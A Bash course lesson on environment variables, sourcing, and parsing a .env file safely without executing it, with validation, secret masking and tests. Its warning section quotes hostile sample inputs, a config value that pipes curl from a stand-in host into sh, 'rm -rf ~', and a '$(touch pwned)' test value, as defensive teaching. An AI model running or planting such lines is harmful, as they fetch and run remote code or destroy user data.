# Day 9 — Environment Variables, Sourcing, and Safe Config Loading

Today's goal: configure a script from its environment, share one reusable config
across scripts, and — the part that actually matters in production — load that
config *safely*, validating every required value before the app trusts it.

---

## 📁 Scripts for today

All live in `scripts/advanced/day9/`.

| # | File | What it does | Try it |
|---|---|---|---|
| 1 | `config-loader.sh` | Parses a `.env` file without executing it, validates required vars, applies defaults, and exports the result | `./scripts/advanced/day9/config-loader.sh` |
| 2 | `app.sh` | A tiny consumer that sources the loader and uses the config | `./scripts/advanced/day9/app.sh` |
| 3 | `tests/config-loader.bats` | 12 tests covering parsing, validation, defaults, secret masking, and the no-`source` guarantee | `bats scripts/advanced/day9/tests/` |

> **🔑 Set up your `.env` first.** These scripts read the repo-root `.env`, which
> is git-ignored. Copy the template and fill it in:
> ```bash
> cp .env.example .env
> ```

---

## 1. Environment variables

```bash
export APP_ENV="prod"       # exported — visible to child processes
TARGET_HOST="10.0.0.10"     # not exported — visible only to this shell
```

A child process (another script, a program you launch) inherits only the
*exported* variables. That distinction is the whole reason `config-loader.sh`
ends with an explicit `export` list.

Read a variable defensively with `${VAR:-default}` so `set -u` doesn't abort on
an unset name:

```bash
port="${TARGET_PORT:-443}"   # use 443 if TARGET_PORT is unset or empty
```

---

## 2. Sourcing vs. executing

```bash
./config-loader.sh     # runs in a NEW shell; its exports die with it
source ./config-loader.sh   # runs in THIS shell; exports stay
```

Day 9's design hinges on this: `app.sh` **sources** the loader so the validated
variables land in `app.sh`'s own environment.

```bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/config-loader.sh"
```

**Resolve the path from `${BASH_SOURCE[0]}`, not the current directory.** A
hardcoded `source ./scripts/advanced/day9/config-loader.sh` only works when you
run it from the repo root and breaks from anywhere else — the same lesson Day 8's
test helper applied by deriving paths from `$BATS_TEST_DIRNAME`.

---

## 3. Never `source` an untrusted `.env`

This line looks harmless and is the most common mistake in config loaders:

```bash
source .env      # DON'T
```

`source` executes the file as Bash. A config file containing
`API_KEY=$(curl evil.sh | sh)` or a stray `rm -rf ~` runs with your privileges.
Parse it instead — accept `KEY=VALUE`, skip comments and blanks, and *refuse*
anything that isn't a valid assignment rather than running it:

```bash
load_env() {
  local file="$1" line key val
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line%$'\r'}"                       # tolerate CRLF
    [[ "$line" =~ ^[[:space:]]*# ]] && continue # comment
    [[ "$line" =~ ^[[:space:]]*$ ]] && continue # blank
    line="${line#export }"
    if [[ ! "$line" =~ ^[[:space:]]*([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
      log "WARN" "Ignoring malformed line: $line"
      continue
    fi
    key="${BASH_REMATCH[1]}"; val="${BASH_REMATCH[2]}"
    if [[ "$val" =~ ^\"(.*)\"$ ]] || [[ "$val" =~ ^\'(.*)\'$ ]]; then
      val="${BASH_REMATCH[1]}"                  # strip surrounding quotes
    fi
    printf -v "$key" '%s' "$val"
    export "${key?}"
  done <"$file"
}
```

The test suite proves this: a `.env` containing `$(touch pwned)` loads cleanly
and the marker file is never created.

---

## 4. Match the template — names have to line up

The loader validates the exact names in `.env.example`. The deployment target is
`TARGET_HOST` / `TARGET_PORT` — there is no `DB_HOST`:

```bash
# .env.example
APP_ENV=
TARGET_HOST=
TARGET_PORT=
API_KEY=
DB_PASS=
SSH_KEY=
```

A loader that requires a name the template never defines can never succeed with
a correct `.env`. Keep the required list and the template in lockstep.

---

## 5. Validate, default, freeze

```bash
required_vars=("APP_ENV" "TARGET_HOST" "API_KEY")

missing=()
for var in "${required_vars[@]}"; do
  [[ -z "${!var:-}" ]] && missing+=("$var")
done
[[ ${#missing[@]} -gt 0 ]] && { log "ERROR" "Missing: ${missing[*]}"; exit 1; }
```

Report **every** missing variable at once (like Day 6's `require_var`), not just
the first — nobody wants to fix one, re-run, and discover the next.

Apply defaults only where empty, sanity-check the types, then make the config
read-only so a later accidental reassignment fails loudly:

```bash
: "${TARGET_PORT:=443}"
[[ "$TARGET_PORT" =~ ^[0-9]+$ ]] || { log "ERROR" "TARGET_PORT must be numeric"; exit 1; }
readonly APP_ENV TARGET_HOST TARGET_PORT API_KEY DEBUG LOG_LEVEL MAX_RETRIES
export   APP_ENV TARGET_HOST TARGET_PORT API_KEY DEBUG LOG_LEVEL MAX_RETRIES
```

---

## 6. Never log a secret in the clear

`config-loader.sh` masks anything sensitive before printing it:

```bash
mask() {
  local v="$1"
  ((${#v} <= 4)) && { printf '****'; return; }
  printf '%s***%s' "${v:0:2}" "${v: -2}"
}
log "INFO" "API_KEY: $(mask "$API_KEY")"   # -> API_KEY: sk***90
```

Logs end up in CI output, terminals, and files that outlive the run. A masked
value is enough to confirm “yes, it loaded” without leaking the credential.

---

## 7. Run it

```bash
chmod +x scripts/advanced/day9/config-loader.sh scripts/advanced/day9/app.sh
cp .env.example .env    # then fill in real values
./scripts/advanced/day9/app.sh
```

```
[…] [CONFIG] [SUCCESS] Config loaded successfully
[…] [CONFIG] [INFO] Environment: staging | Target: localhost:443 | Debug: false | API_KEY: sk***90
Connecting to localhost:443 as staging ...
API call authorized (key present: yes)
```

---

## 8. Testing

```bash
bats scripts/advanced/day9/tests/
```

```
1..12
ok 1 both scripts are executable
ok 2 loads a valid .env and reports success
ok 3 exits 1 with a clear error when the config file is missing
ok 4 fails and names every missing required variable
ok 5 uses TARGET_HOST, not the old DB_HOST name
ok 6 applies defaults for optional variables
ok 7 rejects an invalid APP_ENV
ok 8 rejects a non-numeric TARGET_PORT
ok 9 never sources the .env: a command in the file is not executed
ok 10 masks the API key instead of printing it in the clear
ok 11 app.sh sources the loader and connects with the loaded config
ok 12 app.sh works from any working directory (path resolved via BASH_SOURCE)
```

The suite makes `CONFIG_FILE` point at a per-test temp file — the same
overridable-path pattern Day 8 used for `LOG_FILE` — so no test ever touches the
repo's real `.env`.

---

## 9. Pre-commit

Day 9 needs no new hooks; the repo-wide `.pre-commit-config.yaml` already covers
it end to end:

- **ShellCheck** (`--severity=error`) and **shfmt** (`-i 2 -ci`) keep the two
  scripts lint-clean and consistently formatted.
- **Gitleaks** + **detect-private-key** ensure the real `.env` (with its
  `API_KEY`, `DB_PASS`, `SSH_KEY`) never gets committed — which is exactly why
  `.env` is git-ignored and only `.env.example` is tracked.

```bash
pre-commit run --all-files
```

---

## Recap

| Concept | One-liner |
|---|---|
| export | Only exported vars reach child processes |
| source | Runs in the current shell — how `app.sh` gets the config |
| Path resolution | Derive from `${BASH_SOURCE[0]}`, never the CWD |
| No `source .env` | Parse `KEY=VALUE`; executing a config file is a code-exec hole |
| Match the template | Required names must equal `.env.example` (`TARGET_HOST`, not `DB_HOST`) |
| Validate | Report every missing var; type-check ports and counts |
| readonly | Freeze config so later reassignment fails loudly |
| Mask secrets | Never print `API_KEY` / `DB_PASS` / `SSH_KEY` in the clear |

**Verify, from the repo root:**

```bash
shellcheck scripts/advanced/day9/config-loader.sh scripts/advanced/day9/app.sh
bats scripts/advanced/day9/tests/
```

Next up: **Day 10 — Modular Scripting & Reusable Libraries.**